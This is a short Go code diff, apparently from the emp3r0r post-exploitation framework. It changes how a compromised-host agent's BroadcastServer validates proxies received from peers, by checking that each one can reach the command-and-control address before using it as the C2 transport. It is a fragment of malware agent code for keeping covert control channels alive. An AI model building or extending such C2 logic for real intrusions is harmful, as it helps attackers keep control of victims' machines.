@@ -54,7 +54,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			RuntimeConfig.ShadowsocksPort,
 			RuntimeConfig.Password,
 			RuntimeConfig.AutoProxyPort)
-		for !tun.IsProxyOK(rproxy) {
+		for !tun.IsProxyOK(rproxy, emp3r0r_data.CCAddress) {
 			time.Sleep(time.Second)
 		}
 		RuntimeConfig.C2TransportProxy = rproxy
@@ -81,12 +81,13 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			continue
 		}
 		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
-		if RuntimeConfig.C2TransportProxy != "" && tun.IsProxyOK(RuntimeConfig.C2TransportProxy) {
+		if RuntimeConfig.C2TransportProxy != "" &&
+			tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
 			log.Printf("BroadcastServer: %s already set and working fine\n", RuntimeConfig.C2TransportProxy)
 			continue
 		}
 
-		if tun.IsProxyOK(decMsg) {
+		if tun.IsProxyOK(decMsg, emp3r0r_data.CCAddress) {
 			RuntimeConfig.C2TransportProxy = decMsg
 			log.Printf("BroadcastServer: %s set as RuntimeConfig.AgentProxy\n", RuntimeConfig.C2TransportProxy)
 
